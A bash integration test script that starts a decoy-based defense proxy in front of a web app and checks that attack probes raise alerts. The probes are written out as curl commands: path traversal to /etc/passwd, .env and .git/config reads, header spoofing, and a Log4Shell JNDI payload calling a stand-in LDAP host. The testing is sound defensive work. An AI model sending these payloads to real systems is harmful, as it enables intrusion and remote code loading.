#!/bin/bash
# Run integration tests against neowriter protected by cloud-active-defense minimal stack.
# Prerequisites: run ./setup-neowriter.sh first to clone the neowriter repo.

set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

COMPOSE_FILE="docker-compose.neowriter.yaml"
export COMPOSE_FILE
PROXY="http://localhost:8000"

if [ ! -d "$SCRIPT_DIR/neowriter" ]; then
  echo "neowriter not found. Run ./setup-neowriter.sh first."
  exit 1
fi

echo "Starting neowriter stack..."
docker compose -f "$COMPOSE_FILE" down --remove-orphans 2>/dev/null || true
docker compose -f "$COMPOSE_FILE" up -d --build

echo "Waiting for proxy to be ready..."
for i in $(seq 1 30); do
  if curl -sf "$PROXY/" > /dev/null 2>&1; then
    echo "Proxy ready."
    break
  fi
  if [ "$i" -eq 30 ]; then
    echo "Proxy did not become ready in time. Check: docker compose -f $COMPOSE_FILE logs"
    docker compose -f "$COMPOSE_FILE" down
    exit 1
  fi
  sleep 2
done

echo "Waiting for WASM plugin to load initial decoy config..."
for i in $(seq 1 20); do
  if docker compose -f "$COMPOSE_FILE" logs proxy 2>&1 | grep -q "read new config"; then
    echo "Config loaded."
    break
  fi
  if [ "$i" -eq 20 ]; then
    echo "WASM plugin did not load config in time. Check: docker compose -f $COMPOSE_FILE logs proxy"
    docker compose -f "$COMPOSE_FILE" down
    exit 1
  fi
  sleep 2
done

echo ""
echo "=== Neowriter Integration Tests ==="

passed=0
failed=0

check_decoy_alert() {
  local name="$1"
  local decoy_key="$2"
  # Capture logs to a variable — avoids SIGPIPE on docker compose when grep -q exits early.
  # Use grep -c (reads all input, no early exit) so echo also cannot get a SIGPIPE.
  local proxy_logs
  proxy_logs=$(docker compose -f "$COMPOSE_FILE" logs proxy 2>&1)
  if [ "$(echo "$proxy_logs" | grep -cF "\"DecoyKey\":\"$decoy_key\"" || true)" -gt 0 ]; then
    echo -e "\033[0;32mPASS\033[0m $name"
    ((++passed))
  else
    echo -e "\033[0;31mFAIL\033[0m $name"
    ((++failed))
  fi
}

# 1-A: CDN lure — the injected hint says /cdn/assets/../admin/config; browsers/clients
#       normalize the path, so detection checks the resolved URL /cdn/admin/config
curl -s "$PROXY/cdn/admin/config" > /dev/null; sleep 2
check_decoy_alert "1-A CDN lure (normalized path)" "/cdn/admin/config"

# 1-B: Admin panel URL probe
curl -s "$PROXY/admin/panel" > /dev/null; sleep 2
check_decoy_alert "1-B Admin panel probe" "/admin/panel"

# 1-C: Export endpoint probe
curl -s "$PROXY/api/export/all" > /dev/null; sleep 2
check_decoy_alert "1-C Export endpoint probe" "/api/export/all"

# 1-D: Internal config probe
curl -s "$PROXY/internal/config" > /dev/null; sleep 2
check_decoy_alert "1-D Internal config probe" "/internal/config"

# 2-A: .env file probe
curl -s "$PROXY/.env" > /dev/null; sleep 2
check_decoy_alert "2-A .env file probe" "/.env"

# 4-A: X-Forwarded-For header spoofing (header names are lowercase in HTTP/2)
curl -s -H "x-forwarded-for: 127.0.0.1" "$PROXY/" > /dev/null; sleep 2
check_decoy_alert "4-A X-Forwarded-For spoof" "x-forwarded-for"

# 4-C: X-Original-URL header override attempt
curl -s -H "x-original-url: /admin" "$PROXY/" > /dev/null; sleep 2
check_decoy_alert "4-C X-Original-URL probe" "x-original-url"

# 6-A: Path traversal reaches /etc/passwd after Envoy normalizes ../../
#       (Envoy strips ../ so we test the normalized destination path)
curl -s "$PROXY/../../etc/passwd" > /dev/null; sleep 2
check_decoy_alert "6-A Path traversal → /etc/passwd" "/etc/passwd"

# 6-B: Path traversal via file GET parameter (query strings are NOT normalized)
curl -s "$PROXY/?file=../../../../etc/passwd" > /dev/null; sleep 2
check_decoy_alert "6-B Path traversal via GET param" "file"

# 7-A: SSTI probe via template GET parameter (whenSeen fires on key presence)
curl -s "$PROXY/?template=test" > /dev/null; sleep 2
check_decoy_alert "7-A SSTI probe via GET param" "template"

# 10-B: .git directory recon probe
curl -s "$PROXY/.git/config" > /dev/null; sleep 2
check_decoy_alert "10-B .git probe" "/.git"

# 10-C: WordPress admin panel recon probe
curl -s "$PROXY/wp-admin" > /dev/null; sleep 2
check_decoy_alert "10-C wp-admin probe" "/wp-admin"

# L4J-1: Log4Shell injection via user-agent header (lowercase per HTTP/2)
curl -s -A '${jndi:ldap://canary.example.com/a}' "$PROXY/" > /dev/null; sleep 2
check_decoy_alert "L4J-1 Log4Shell via user-agent" "user-agent"

echo ""
echo "=== Results: $passed passed, $failed failed ==="

echo "Stopping stack..."
docker compose -f "$COMPOSE_FILE" down

if [ "$failed" -gt 0 ]; then
  exit 1
fi
